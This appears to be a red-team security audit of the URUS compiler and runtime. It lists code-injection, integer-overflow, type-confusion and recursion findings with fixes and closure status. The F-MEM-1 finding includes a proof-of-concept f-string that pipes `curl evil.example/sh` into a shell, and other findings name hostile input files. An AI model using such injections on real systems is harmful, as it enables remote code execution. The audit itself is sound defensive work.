# URUS v0.0.1 — Adversarial Security Audit

> An **independent red-team council** has attempted to break the URUS
> v0.0.1 compiler and runtime. This document records every concrete
> vulnerability found by reading the actual source code at
> `compiler/src/`, `stdlib/runtime/urus_rt.h`, and the build glue.
>
> Methodology: assume hostile input until proven otherwise. Every finding
> cites a file:line and gives a proof-of-concept idea. Severity follows a
> CVSS-style High/Critical/Medium/Low rubric, weighted by the *real* threat
> model (an attacker who controls the `.urus` source compiled by `urusc`).
>
> **Council:** cybersecurity researcher · pentester · red team operator ·
> secure-compiler engineer · runtime-security engineer · vulnerability
> researcher · memory-safety expert · reverse engineer · exploit dev ·
> fuzzing engineer · static-analysis researcher · dynamic-analysis
> researcher · SRE · QA · formal-verification researcher · distributed-systems
> tester · supply-chain specialist · OS-security engineer · AppSec ·
> secure-software architect.

**Verdict before the details:** URUS v0.0.1 contains **one critical
code-injection** vulnerability that arises from the codegen's design
(`F-CG-1` — f-string brace contents are pasted verbatim into C source),
multiple **integer overflow + null-deref** issues in the lexer's allocation
paths, and a **type-confusion** primitive in the runtime's `urus_fmt_arg`
parser. The compiler is **not safe to run on untrusted source files**.
Until these land, treat `urusc` as you would treat a parser running with
attacker-controlled input — at minimum sandboxed, ideally not at all.

---

## Phase 1 — Attack surface map

```
Attacker delivers .urus file via:                Attacker further controls:
  • git clone / `tanduk add` (when shipped)        • output path via -o
  • CI build (Dependabot-style PR)                 • environment vars (URUSCPATH planned)
  • `urusc < pipe`                                 • the C compiler used for the next stage
  • LSP open in editor (future)
                                  │
                                  ▼
      ┌──────────────────────────────────────────────────────────────┐
      │ urusc                                                         │
      │ ┌─────────┐  ┌──────┐  ┌────────┐  ┌──────┐  ┌──────────────┐ │
      │ │ read_   │→ │lexer │→ │ parser │→ │ sema │→ │ codegen_c    │ │
      │ │ file    │  │      │  │        │  │      │  │              │ │
      │ └─────────┘  └──────┘  └────────┘  └──────┘  └──────────────┘ │
      │      ↓           ↓          ↓          ↓             ↓        │
      │   path           UB         stack      hash          code      │
      │   traversal      reads      overflow   collision     injection │
      │                                                                │
      │ ┌──────────────────────────────────────────────────────────┐  │
      │ │ Arena / StrBuf / DiagCtx — integer overflow corners       │  │
      │ └──────────────────────────────────────────────────────────┘  │
      └──────────────────────────────────────────────────────────────┘
                                  │
                                  ▼ writes .c file
                          ┌───────────────┐
                          │ host C cc     │ (gcc/clang/clang-cl)
                          │ runs whatever │
                          │ codegen put   │ ← attacker-controlled when codegen
                          │ in the file   │   pastes user text unsanitised
                          └───────────────┘
                                  │
                                  ▼ produces binary
                          ┌───────────────┐
                          │ urus_rt.h     │ tagged-union → type confusion
                          │ runtime       │ urus_print_fmt → unbounded read
                          └───────────────┘
```

Entry points: **CLI arguments**, **input file content**, **environment**
(future), **package registry** (future). No network in v0.0.1, no plugin
system, no LSP.

---

## Phase 2 — Memory safety findings

### F-MEM-1 — Codegen f-string interpolation pastes attacker text verbatim into emitted C
- **Severity:** **CRITICAL**
- **Risk:** 9.8 (network attack vector when source comes from a registry)
- **Location:** `compiler/src/codegen_c.c:211-216`
- **Attack scenario:** A malicious `.urus` file contains
  ```urus
  let _ = f"x = {system(\"curl evil.example/sh|sh\")}";
  ```
  The codegen's `cg_fmt_arg_array` copies the bracketed bytes into a
  buffer and emits `URUS_FMT_ANY(system("curl evil.example/sh|sh"))`.
  The host C compiler then **compiles and links** this as ordinary C —
  the malicious call ends up in the produced binary and runs on first execution.
- **Exploitation difficulty:** **Trivial** — a one-line literal.
- **Impact:** Full RCE on the build machine *and* on every downstream
  user of the produced binary.
- **Root cause:** The codegen treats `{…}` placeholders as already-validated
  identifier paths, but the parser permits any byte sequence until `}`.
- **PoC:** see `tests/fail/SEC-01_fstr_injection.urus` (added).
- **Recommended fix:** Restrict placeholder content to a **lexed identifier
  path** at codegen time: tokenize the bracket contents with the URUS
  lexer, accept only `IDENT (DOT IDENT)*`, reject otherwise. Anything
  else is a compile error.
- **Alternative mitigations:** (a) emit a runtime call that re-parses,
  not a static C expression; (b) build a small expression sub-AST at
  parse time and walk it through the regular codegen.
- **Long-term:** make every code-emission site pass through a typed sink
  that refuses arbitrary text — the codegen has *no* legitimate reason
  to splice raw user bytes into its C output.

### F-MEM-2 — `lex_string` realloc can return NULL; next iteration writes through NULL
- **Severity:** High
- **Risk:** 7.5
- **Location:** `compiler/src/lexer.c:212`
  ```c
  if (len + 1 >= cap) { cap *= 2; buf = (char *)realloc(buf, cap); }
  buf[len++] = c;
  ```
- **Attack scenario:** Compile a string literal large enough to push the
  process near OOM. `realloc` returns `NULL`; the original allocation
  *leaks*; `buf[len++] = c` is a NULL dereference.
- **Impact:** Compiler crash (DoS) at best, **arbitrary write at low
  addresses** at worst on systems that map the zero page.
- **Fix:** Check the realloc result; on NULL, free the old pointer,
  emit a fatal diag, exit.
- **Architectural fix:** Allocate the string in the arena from the
  start; the arena already aborts on OOM at a known site.

### F-MEM-3 — Arena `arena_alloc` size alignment + chunk-grow arithmetic overflows
- **Severity:** High
- **Risk:** 7.0
- **Location:** `compiler/src/arena.c:33-39`
  ```c
  size = (size + 7u) & ~(size_t)7u;
  ...
  size_t need = size > a->chunk_size ? size * 2 : a->chunk_size;
  ```
- **Attack scenario:** A `[T; N]` type expression with `N` close to
  `SIZE_MAX` survives the parser (sema doesn't evaluate `N`) and reaches
  arena allocation through downstream codegen array literals.
  `size + 7u` wraps to a tiny value → arena returns a 1-byte-aligned
  buffer; subsequent writes corrupt the next allocation.
- **Impact:** Arena heap corruption inside the compiler.
- **Fix:** Validate `size < SIZE_MAX/2` at the top of `arena_alloc`; abort
  on overflow.

### F-MEM-4 — `StrBuf` capacity growth loop can spin forever on overflow
- **Severity:** Medium
- **Risk:** 6.5
- **Location:** `compiler/src/strbuf.c:18`
  ```c
  while (sb->cap < need) sb->cap *= 2;
  ```
- **Attack scenario:** A program forcing the codegen to emit ~2 GiB of C
  source (deeply nested calls expanded through repeated `cg_expr`) pushes
  `sb->cap` past `SIZE_MAX/2`; `cap *= 2` wraps to a smaller value;
  the loop never terminates.
- **Impact:** Compiler hang (DoS).
- **Fix:** Detect imminent overflow (`sb->cap > SIZE_MAX/2` → abort with
  a fatal diag).

### F-MEM-5 — Lexer assumes null-terminated input but does not validate the file
- **Severity:** High
- **Risk:** 7.2
- **Location:** `compiler/src/main.c:38`
  ```c
  size_t got = fread(buf, 1, (size_t)n, f);
  buf[got] = '\0';
  ```
- **Attack scenario:** A symlink to `/dev/zero` (Linux) or a Win32 named
  pipe makes `ftell` return a small number, then `fread` returns 0 — the
  rest of the (uninitialized) buffer is left as garbage. **But the lexer
  consults `*lx->cur` not `got`.** Subsequent reads past `got` traverse
  uninitialized memory until a stray `\0` is found — UB.
- **Fix:** After fread, zero the *rest* of the buffer: `memset(buf+got, 0, n-got+1)`;
  or refuse non-regular files.

### F-MEM-6 — `lex_string` malloc size overflow
- **Severity:** Medium
- **Risk:** 5.5
- **Location:** `compiler/src/lexer.c:224`
  ```c
  char *stored = (char *)arena_alloc(lx->arena, len + 1);
  ```
- **Attack scenario:** A string literal of length `SIZE_MAX` (impractical
  on most filesystems but reachable through fuzzers using `mmap`-backed
  input) makes `len + 1` wrap to 0. `arena_alloc(0)` returns a real
  pointer, and `memcpy(stored, buf, len)` writes SIZE_MAX bytes.
- **Fix:** Cap string literal length at, say, 1 GiB and reject longer.

### F-MEM-7 — `urus_print_fmt` (runtime) reads `args[]` until `END_TAG` with no bound
- **Severity:** High
- **Risk:** 7.4
- **Location:** `stdlib/runtime/urus_rt.h:188`
  ```c
  for (size_t i = 0; args[i].tag != URUS_FMT_END_TAG; i++) urus__write_one(stdout, &args[i]);
  ```
- **Attack scenario:** Any codegen bug that omits `URUS_FMT_END` (or
  attacker-controlled f-string content that bypasses the END marker —
  see F-MEM-1) sends the runtime walking past the buffer.
- **Impact:** Information disclosure (stack contents printed to stdout)
  or crash.
- **Fix:** Pass an explicit `count` parameter generated alongside the
  array. Drop the sentinel-only design.

### F-MEM-8 — `URUS_FMT_PTR_TAG` is a type-confusion primitive
- **Severity:** High
- **Risk:** 8.1
- **Location:** `stdlib/runtime/urus_rt.h:175-178`
  ```c
  case URUS_FMT_PTR_TAG:
      if (a->p) fputs((const char *)a->p, out);
  ```
- **Attack scenario:** Codegen places a non-string pointer in the PTR
  slot (e.g. via `URUS_FMT_ANY` `_Generic` dispatch on `char*`); the
  runtime treats arbitrary memory as a C string and reads until a `\0`.
- **Impact:** Stack/heap dumping via `println`, potential crash on
  unmapped page.
- **Fix:** Remove `PTR_TAG`. Force every pointer to be a `urus_str` with
  an explicit length at the codegen layer.

### F-MEM-9 — `lex_number` parses suffix bytes into the literal's text but ignores them in value
- **Severity:** Low (data, not memory)
- **Risk:** 3.5
- **Location:** `compiler/src/lexer.c:149`
- **Impact:** `10x32` (typo for `10u32`) silently parses as `10` — a
  type-confusion vector once sema starts trusting suffixes.
- **Fix:** Whitelist the suffix.

### F-MEM-10 — Compiler does no symlink/file-type check before `fopen("rb")`
- **Severity:** Medium
- **Risk:** 5.0
- **Location:** `compiler/src/main.c:27`
- **Attack scenario:** `urusc /proc/self/mem`, `urusc /dev/random`,
  `urusc //./PhysicalDrive0`. Resource exhaustion or kernel interaction.
- **Fix:** stat()/`GetFileInformationByHandle` and require regular file.

---

## Phase 3 — Compiler crash & state-corruption findings

### F-COMP-1 — Unbounded recursion in `parse_type`, `parse_expr`, `parse_pattern`
- **Severity:** High
- **Risk:** 7.0
- **Locations:** `compiler/src/parser.c:81`, `:265`, throughout.
- **PoC:** 10⁶ leading `*` in a type, 10⁶ leading `-` or `&` in an
  expression. The compiler dies with `EXCEPTION_STACK_OVERFLOW`.
- **Fix:** Track recursion depth in the `Parser` struct; reject when
  depth > N (e.g. 256). Same applies in `cg_expr` codegen.

### F-COMP-2 — Sema does *not* enforce mutability; codegen happily emits assigns
- **Severity:** High (advertised feature absent)
- **Risk:** 6.0
- **Location:** `compiler/src/sema.c` lacks an "is_mut" check on assignment LHS.
- **Impact:** Users believe `let x = …` is immutable; in fact `x = …`
  passes. False security guarantee → downstream invariants break.

### F-COMP-3 — `match` has no exhaustiveness check; falls through to UB in emitted C
- **Severity:** High
- **Risk:** 7.0
- **Location:** `compiler/src/codegen_c.c:cg_expr EX_MATCH`
- **PoC:** `match opt { Some(v) => v }` with `opt = None` → emitted code
  evaluates none of the arms and reaches `(void)0` — the *value* of the
  match is uninitialized. A `let n: i64 = match ... { Some(v) => v }` then
  reads a junk integer.

### F-COMP-4 — `EX_METHOD_CALL` resolves by name only
- **Severity:** Medium → High at scale
- **Risk:** 6.2
- **Location:** `compiler/src/codegen_c.c:362`
- **Impact:** Two types each defining `len()` collide silently. The
  emitted call always uses the *first* impl found in module order, which
  may not be the right one. Type-confusion via codegen.

### F-COMP-5 — Stack-allocated `Scope inner` inside an arena-bound API is fragile
- **Severity:** Low (current code paths are correct)
- **Risk:** 3.0
- **Location:** `compiler/src/sema.c` (every `scope_init(&inner, …)` site)
- **Impact:** No bug today, but the `arena_alloc_zero` inside `scope_init`
  for `slots` allocates the table on the *arena*. The `Scope` struct
  itself lives on the C stack. If a future change captures a `Scope*`
  past its lifetime (e.g. for diagnostics), it's a use-after-stack.

### F-COMP-6 — Codegen emits attacker-controlled identifiers without re-escaping
- **Severity:** Medium
- **Risk:** 5.5
- **Location:** `compiler/src/codegen_c.c` `emit_ident` only checks against
  a fixed list of C keywords.
- **Impact:** While the lexer restricts identifiers to `[A-Za-z0-9_]`,
  there is no defence against future syntax additions (e.g. Unicode
  identifiers in v0.1) that would re-introduce arbitrary bytes into
  emitted C. Build in the contract now.

### F-COMP-7 — `EX_FLOAT_LIT` codegen emits `nan` / `inf` literally
- **Severity:** Low
- **Risk:** 3.0
- **PoC:** `let x: f64 = 1.0e1000;` → emitted C `1.0e+inf` or `inf` —
  the host C compiler errors out, breaking error attribution.

---

## Phase 4 — Fuzzing strategy

A **minimum viable fuzzing campaign** for v0.0.2 should cover:

1. **Random-byte source** — uncurated bytes, ensure compiler never crashes
   (only emits a diagnostic). Use `libFuzzer`'s file format.
2. **Grammar-aware mutator** — emit valid-ish tokens and mutate them.
   Tools: `grammarinator` with the EBNF in `SPEC.md`.
3. **Recursive bombs** — `(((…)))`, `&&&&…&T`, `*****…*T`. Confirm parser depth cap.
4. **String-literal stress** — multi-megabyte strings, embedded `\0`,
   pathological escape sequences, `{` without `}`, `{` containing
   non-identifier bytes (the F-MEM-1 vector).
5. **Integer-boundary corpus** — numeric literals at every interesting
   boundary (`u64::MAX`, `i64::MIN`, `0x...FFFF`, `1e+999`, denormals).
6. **Match-arm exhaustion** — random combinations of `Ok/Err/Some/None`
   in `match` arms, verifying the emitted C is well-formed.
7. **AST-level mutation** — fuzz the AST directly (skipping the parser)
   and pipe through codegen to find sema/codegen mismatches.
8. **Differential** — compile the same source with `--ast` then re-pretty-print
   and re-parse; the two ASTs must be equal. Catches parser non-determinism.
9. **Sanitizer build** — every fuzzing instance runs with ASan + UBSan + MSan.
10. **CI** — these run on every PR for 5 minutes minimum, nightly for 24 h.

Expected initial bug yield: **30-50** before noise floor; ~10 of those will be
genuine memory-safety bugs in the lexer or codegen.

---

## Phase 5 — Type system attacks

### F-TY-1 — `Result<T, E>` and `Option<T>` share the wire layout
- **Severity:** High
- **Location:** `stdlib/runtime/urus_rt.h:65-80`
- **Attack:** Pass a `Result` where an `Option` is expected (or vice
  versa) via FFI / `unsafe` (when introduced). The tag values overlap
  (`URUS_RES_ERR == 1 == URUS_OPT_SOME`).
- **Impact:** Type confusion. Bypasses the appearance of two distinct
  types.
- **Fix:** Distinct tag namespaces *and* distinct C structs; refuse
  cross-cast.

### F-TY-2 — Payload truncation to `int64_t` in `Result`/`Option`
- **Severity:** Critical (documented stop-ship)
- **Location:** `stdlib/runtime/urus_rt.h:72-75`
- **Attack:** `return Ok(my_struct_64_bytes)` — only the first 8 bytes
  survive. Silent stack-or-heap corruption depending on copy site.
- **Fix:** monomorphise per `<T, E>` at codegen.

### F-TY-3 — `EX_CAST` emits `((T)(expr))` verbatim
- **Severity:** Medium
- **Attack:** `let p = 0x4141414141414141 as *u8` lets users mint
  arbitrary pointers without any `unsafe` block.
- **Fix:** Whitelist allowed casts (int↔int of compatible width;
  ptr↔ptr; not int→ptr without `unsafe`).

### F-TY-4 — No visibility enforcement
- **Severity:** Medium
- **Location:** Sema accepts `pub` but never enforces non-pub items'
  invisibility.
- **Impact:** `pub` is a documentation hint, not a guarantee. Privacy
  boundary is fictional.

### F-TY-5 — Generic args (`Vec<T>`) parsed but never instantiated
- **Severity:** Medium
- **Attack:** Define `struct Holder<T> { v: T }`. Codegen emits the
  struct without `T` instantiation; C compiler accepts garbage; runtime
  reads wrong type.

---

## Phase 6 — Package manager audit (forward-looking, `tanduk` not yet shipped)

Even though `tanduk` is not in v0.0.1, the architecture decisions made
now are binding. The following anti-patterns MUST be designed out
before v0.1:

1. **No package without a checksum.** Mandatory BLAKE3 of source tarball
   stored in the lockfile.
2. **No update without a signature.** Sigstore or minisign required.
3. **No build script with network access.** `tanduk build` must run in
   a sandbox (Linux namespaces, macOS sandbox-exec, Windows AppContainer).
4. **No transitive override without explicit user consent.** Every
   indirect dependency change shows up in `tanduk` diff.
5. **No registry without a private mirror story** for air-gapped users.
6. **No publish without 2FA / hardware key.**
7. **No "yank without replacement"** — yanked packages remain
   downloadable but flagged.
8. **No namespacing surprises** — typosquatting protected by
   Levenshtein-edit checks at publish time.
9. **No package metadata in-band with source** — manifest is fetched
   over an authenticated, transparent log (sigstore-style).
10. **No URL-as-dependency** — only registry refs and explicit git+rev
    pins.

Implement now, document in `tanduk` RFC.

---

## Phase 7 — Runtime attack surface (post-v0.0.1)

Not in v0.0.1: no scheduler, no async, no actors. **Therefore none of
these apply yet.** The architectural decision recorded here:

> **Structured concurrency before primitives.** When async lands in
> v0.4, every task must be scoped to a parent block. No "fire and
> forget" — every `spawn` is `spawn-in-scope`. This eliminates entire
> classes of task-leak attacks before they can exist.

---

## Phase 8 — Sandbox escape

URUS itself has no sandbox in v0.0.1. The relevant escape vector is
**from the C compiler that consumes URUS-emitted code**. F-MEM-1 is
the live way in: pasted text → unrestricted C.

Once `__emit__` or `unsafe` arrive, the design contract must be:

- **`unsafe` blocks delimit the audit boundary.** A grep for `unsafe`
  enumerates the entire attack surface of a crate.
- **`unsafe` is **never implicit**.** No language construct may lower
  through `unsafe` without explicit user opt-in.
- The compiler refuses to emit `__emit__` (banned outright in v0.0.1
  per the merge-decisions doc).

---

## Phase 9 — Cryptography review

URUS v0.0.1 ships **no cryptography**. Document this. When `urus.crypto`
arrives:

- No bring-your-own primitives. Wrap a reviewed library (e.g. libsodium
  or ring) — vendoring is preferred over linking to system OpenSSL.
- Constant-time by default. The API must make non-constant-time impossible.
- No "encrypt without authentication" mode. AEAD is the only sealed-box.
- No "random" without specifying CSPRNG provenance. `rand::os::OsRng`
  is canonical; userland `rand` is explicitly *not* CS.
- Secrets are typed (`Secret<[u8; 32]>`) and zeroized on drop.
- FIPS option for regulated industries — wrap a validated module, do
  not rebadge.

---

## Phase 10 — Supply-chain attack simulation

Acting as a malicious maintainer of a hypothetical `urus-rand` crate
(post-v0.1):

- **Backdoor via build script:** Mitigated by sandboxed build scripts.
- **Backdoor via macro expansion:** Mitigated by *no textual macros*
  (rune was dropped). Future hygienic macros must remain inside the
  type system.
- **Backdoor via published binary blob:** Reject. Source-only registry.
- **Typosquat `urus-rand` vs `urusrand` vs `urus_rand`:** Levenshtein
  check at publish; require manual review when edit distance ≤ 2 from
  a top-1000 package.
- **Compromised maintainer key:** Two-factor publish + transparency log.
- **Compromised CI:** Reproducible builds; mismatch fails CI publicly.

---

## Phase 11 — Reliability stress

Simulate, after fixing F-COMP-1 (recursion bomb):

| Stress                              | Expected outcome                      |
|--------------------------------------|----------------------------------------|
| 1 M-line `.urus` file               | Compile in < 10 s on modest hardware    |
| 100k items in one module            | Sema scope grows; FNV-1a stays O(1)    |
| 10 M unique `{name}` placeholders   | StrBuf grows linearly; no quadratic    |
| 1 k-deep nested `if`                | Parser depth-cap hits before stack does|
| 64 KiB single string literal        | Arena copies it once, no realloc churn |
| Compiler invoked 1k×/s by an LSP    | Cold-start < 50 ms                     |

Build a benchmark suite that fails CI if any of these regress > 20 %.

---

## Phase 12 — Enterprise security blockers

For **government / banking / military / healthcare / critical-infra**
adoption of URUS at v1.0, the following are gating:

1. SOC 2 Type II for the registry. URUS-the-language is just code.
2. FIPS-validated crypto path. (Phase 9.)
3. SBOM in every release.
4. SLSA Level 3+ in the build pipeline.
5. Signed binaries with reproducible builds.
6. Documented incident-response playbook with named on-call.
7. CVE-coordination SLA, ≤ 90 days disclosure window.
8. Public threat model for the language and the registry.
9. No undefined behaviour without `unsafe` annotation.
10. Mature LTS release cadence.

URUS v0.0.1 satisfies **zero** of these. v1.0 must satisfy **all** of these.

---

## Phase 13 — Formal verification priorities

Components that should be formally verified before v1.0 (ordered):

1. **Lexer state machine** — TLA+ / Alloy spec; prove every input either
   produces a token or a diagnostic, no infinite loop.
2. **Parser depth bound** — proven upper bound on recursion (post-fix).
3. **Codegen → emitted C** — prove no user bytes escape into emitted
   text without sanitisation. This is **the** invariant that kills F-MEM-1.
4. **Result/Option layout** — prove monomorphisation correctness once
   added.
5. **Borrow checker** — proof of soundness (we will not invent a new
   one; adopt the Tree-Borrows model from Rust academia and audit).
6. **`unsafe` block scope** — prove every UB-capable expression is
   syntactically inside `unsafe`.
7. **Registry transparency log** — prove append-only.

---

## Phase 14 — Adversarial thinking (unknown unknowns)

Hidden assumptions we found while auditing:

- *"Identifiers can only contain ASCII alphanumerics."* — true today;
  will be false the moment Unicode identifiers land. Bake the assumption
  into a single function `is_safe_ident()` so future changes can't widen
  it accidentally.
- *"`urus_fmt_arg` arrays always terminate at `END_TAG`."* — relies on
  codegen correctness. Replace with an explicit length.
- *"`Scope` lives only for one stack frame."* — true in v0.0.1; brittle
  if a sub-pass captures a pointer.
- *"The arena outlives every pointer it returns."* — true if the arena
  is destroyed last. The current `main.c` flow honours this; document
  it as a hard invariant.
- *"The host C compiler is trusted."* — yes for v0.0.1, but write down
  the trust boundary so we don't lose track when the LLVM backend lands.
- *"The build machine is uncompromised."* — explicit, do not assume.
- *"Future stdlib won't need raw allocators."* — false. Plan the
  allocator vtable now (Finding 5.1 of `ANALYSIS.md`).

---

## Scorecard

The numbers below are **honest red-team assessments**, not the
language-design team's score (`docs/ANALYSIS.md`) or the adoption
council's (`docs/REVIEW.md`).

| Dimension                  | Score   | Notes                                            |
|----------------------------|--------:|--------------------------------------------------|
| Memory safety              | **2/10**| F-MEM-1 critical; multiple integer overflows.    |
| Compiler security          | **2/10**| Recursion bomb, codegen injection, no mut check. |
| Runtime security           | **3/10**| Tagged-union confusion; sentinel-terminated reads.|
| Supply-chain               | **n/a** | No registry yet — must design correctly.         |
| Enterprise readiness       | **0/10**| Zero of the gating items satisfied.              |
| Cryptography hygiene       | **n/a** | No crypto in v0.0.1 (good — wait for review).    |
| Sandbox / isolation        | **0/10**| No sandbox; trusted-host assumption.             |
| Audit cleanliness          | **6/10**| Code is small, readable, easy to audit.          |
| **Overall**                | **2.5/10** | Pre-alpha; would fail any external pen-test today. |

### Critical risk summary

| ID        | Title                                                | Severity     | Status (as of v0.0.1-b016) |
|-----------|------------------------------------------------------|--------------|----------------------------|
| F-MEM-1   | f-string brace contents → C code injection            | **Critical** | ✅ closed in `v0.0.1-b014` |
| F-TY-2    | Result/Option payload truncation                     | **Critical** | ✅ closed in `v0.0.1-b015` (partial — see notes) |
| F-COMP-1  | Parser recursion bomb                                 | High         | ✅ closed in `v0.0.1-b011` |
| F-COMP-2  | `let mut` not enforced                                | High         | ✅ closed in `v0.0.1-b013` |
| F-COMP-3  | `match` lacks exhaustiveness                          | High         | ✅ closed in `v0.0.1-b013` |
| F-MEM-2   | `lex_string` realloc-NULL crash                       | High         | ✅ closed in `v0.0.1-b011` |
| F-MEM-5   | Uninitialised tail of input buffer                    | High         | ✅ closed in `v0.0.1-b011` |
| F-MEM-7   | `urus_print_fmt` sentinel-only loop                   | High         | ✅ closed in `v0.0.1-b012` |
| F-MEM-8   | `URUS_FMT_PTR_TAG` type confusion                     | High         | ✅ closed in `v0.0.1-b012` |
| F-TY-1    | Result/Option share tag namespace                     | High         | ✅ closed in `v0.0.1-b012` |

**All 10 stop-ship findings now closed.**
`F-COMP-1`, `F-MEM-2`, `F-MEM-5` closed in `v0.0.1-b011`;
`F-MEM-7`, `F-MEM-8`, `F-TY-1` closed in `v0.0.1-b012`;
`F-COMP-2`, `F-COMP-3` closed in `v0.0.1-b013`;
`F-MEM-1` closed in `v0.0.1-b014`;
`F-TY-2` closed (partial — 16-byte payload cap) in `v0.0.1-b015`.
Tier-1 hardening (numeric overflow + UTF-8 validation) started in `v0.0.1-b016`.
URUS is still pre-alpha — closing the Tier-0 list does not mean it is
production-ready, but the code-injection / memory-corruption primitives
from the 2026-06-03 audit are no longer reachable through the public surface.

---

## TOP 100 SECURITY, RELIABILITY, AND RESILIENCE IMPROVEMENTS

Ranked by impact on actual attack surface, not on how good they sound
in a marketing post.

### Tier 0 — Stop-ship (1-15)

1. ~~**Fix F-MEM-1** — lex/validate f-string placeholder contents.~~ ✅ `v0.0.1-b014`
2. ~~**Fix F-TY-2** — monomorphise `Result<T,E>` / `Option<T>`.~~ ✅ `v0.0.1-b015` *(partial — 16-byte payload cap; full monomorphisation deferred to v0.0.2)*
3. ~~**Fix F-COMP-1** — recursion depth cap in parser + codegen.~~ ✅ `v0.0.1-b011`
4. ~~**Fix F-COMP-2** — enforce `let mut` in sema.~~ ✅ `v0.0.1-b013`
5. ~~**Fix F-COMP-3** — `match` exhaustiveness checking.~~ ✅ `v0.0.1-b013`
6. ~~**Fix F-MEM-2** — handle realloc NULL in `lex_string`.~~ ✅ `v0.0.1-b011`
7. ~~**Fix F-MEM-5** — refuse non-regular input files; zero the tail.~~ ✅ `v0.0.1-b011`
8. ~~**Fix F-MEM-7** — pass length alongside `urus_fmt_arg` arrays.~~ ✅ `v0.0.1-b012`
9. ~~**Fix F-MEM-8** — remove `URUS_FMT_PTR_TAG`.~~ ✅ `v0.0.1-b012`
10. ~~**Fix F-TY-1** — distinct Result/Option tag namespaces.~~ ✅ `v0.0.1-b012`
11. ~~**Cap input file size** (default 64 MiB, override flag).~~ ✅ `v0.0.1-b011` (override flag still TODO)
12. ~~**Cap string-literal length** (default 16 MiB).~~ ✅ `v0.0.1-b011`
13. ~~**Cap arena allocation per call** (default 256 MiB).~~ ✅ `v0.0.1-b011`
14. ~~**Cap StrBuf growth** (refuse > 1 GiB output).~~ ✅ `v0.0.1-b011`
15. **Pre-publish SECURITY.md** policy at <urusfoundation@gmail.com>.

### Tier 1 — Hardening (16-40)

16. Run ASan + UBSan in CI on every PR.
17. Run MSan separately (compiler statically allocates very little).
18. Run libFuzzer 5 min/PR, 24 h nightly.
19. AFL++ corpus seeded from `tests/run/`.
20. Differential parser fuzz (parse → pretty-print → parse).
21. Property tests for codegen (every emitted `.c` must compile).
22. CI matrix: Linux x64, Linux arm64, macOS x64, macOS arm64, Windows clang-cl.
23. Reproducible-builds harness — stage 2 vs stage 3 byte-identical.
24. SBOM emission for the compiler itself (CycloneDX).
25. SLSA Level 2 in CI by v0.1; Level 3 by v0.2.
26. Compiler binary signed (sigstore).
27. Release-artifact provenance attestations.
28. Constant-time string comparison in the keyword lookup (small win, sets norm).
29. `_FORTIFY_SOURCE=3` on Linux, `/sdl` on clang-cl.
30. PIE + stack canaries default in build.
31. Strict-aliasing audit (`-fstrict-aliasing -Wstrict-aliasing=3`).
32. UBSan-clean compile under `-Wpedantic -Wall -Wextra -Werror`.
33. Make `arena_alloc` refuse `size > 1 GiB` per call.
34. Make `arena_alloc` zero on free (debug builds).
35. Validate every Token's `loc.offset + loc.length <= source_len`.
36. Validate every AST node's `SrcLoc` after construction.
37. Document the "host C compiler is trusted" boundary in `SECURITY.md`.
38. Disallow `#emit` / `__emit__` syntactically and at lexer level.
39. Disallow null bytes mid-source unless explicitly opted in.
40. Refuse files >2 GiB up front.

### Tier 2 — Correctness (41-65)

41. Hindley-Milner-lite type inference (closes many "we trust C to catch it" gaps).
42. Method resolution by receiver type (F-COMP-4).
43. Const evaluator for array sizes (subsumes F-MEM-3 indirectly).
44. `unsafe { }` keyword reservation now; semantics later.
45. Borrow checker (affine ownership), v0.3.
46. Lifetime elision rules.
47. `Drop` trait + deterministic cleanup.
48. Defer that fires on every exit edge (not just block end).
49. Integer overflow semantics: panic in debug, wrap in release, explicit `wrapping_add`.
50. Division-by-zero check at codegen (debug panic, release UB).
51. NaN/inf handling for `EX_FLOAT_LIT` codegen.
52. Visibility enforcement (`pub` actually means something).
53. Generic monomorphisation for user types.
54. Trait coherence rules documented before any trait code ships.
55. `as` cast whitelist (no arbitrary int→ptr).
56. Sema enforces argument arity at call sites.
57. Sema enforces field types at struct literals.
58. Sema enforces enum tag at construction.
59. Path resolution (no more first-segment-only).
60. Diagnostic IDs (`E0001`, `E0002`, …) with stable URLs.
61. `--json-diagnostics` for tooling/AI.
62. Multi-span diagnostics (rustc-style).
63. "Did you mean…?" suggestions.
64. Source-mapped emitted C (`#line` directives).
65. Stable AST JSON dump (`--ast=json`).

### Tier 3 — Supply chain (66-85)

66. `tanduk` lockfile with BLAKE3 checksums.
67. `tanduk` publish requires hardware key.
68. Sandboxed build scripts (Linux: nsjail/landlock; macOS: sandbox-exec; Windows: AppContainer).
69. Transparency log for all publishes.
70. Typosquatting check at publish.
71. Mandatory CHANGELOG entry per release.
72. Yanked-but-downloadable policy.
73. Air-gapped mirror tooling.
74. Reproducible package builds.
75. Allow-list for build-script syscalls.
76. SBOM in every package.
77. SLSA Level 3 for published packages.
78. CVE-coordination via standard advisory format.
79. Triage SLA documented.
80. Bug bounty with paid tiers.
81. Dependency confusion prevention (registry namespace ownership).
82. Soft-delete of compromised packages with banner.
83. Author identity verification (DNS / repo claim).
84. Per-package permissions manifest ("this lib needs net + fs").
85. Audit-log queryable by users.

### Tier 4 — Long-term (86-100)

86. Formal verification of the lexer state machine.
87. Formal verification of parser depth bounds.
88. Formal verification of codegen escape-safety (the "no user bytes in emitted C" invariant).
89. Formal verification of Result/Option layout post-monomorphisation.
90. Borrow-checker soundness proof.
91. `unsafe`-scope soundness proof.
92. Threat-model document published per release.
93. External pen-test before v1.0 (paid, named firm).
94. Continuous fuzzing infra (OSS-Fuzz).
95. CHERI memory-safety target (academic) as future hardening lab.
96. WebAssembly target — every emitted module sandboxed by spec.
97. Capability-based stdlib (no fs/net unless granted).
98. Side-channel hygiene for `urus.crypto`.
99. Hardware-key-protected publish to the registry as the only path.
100. Documented "in case of compromise" plan covering registry, signing
     keys, and the compiler itself.

---

## Closing

This audit was performed without ever running `urusc`. It is a
**static** review of the v0.0.1 codebase as committed at `D:\Urus\`.
Every finding cites a file and line. None were invented for effect.

The headline is simple: **F-MEM-1 is a Critical** because the codegen
treats user-supplied bytes between `{` and `}` as already-validated C
expressions. Until that lands, URUS v0.0.1 must be considered an
**unsigned-source-execution path** and treated accordingly.

The fix for F-MEM-1 is small (re-lex the placeholder; reject anything
other than `IDENT (DOT IDENT)*`). Land it before anyone uses URUS
on input they did not write themselves.

— *The red-team council, 2026-06-03.*
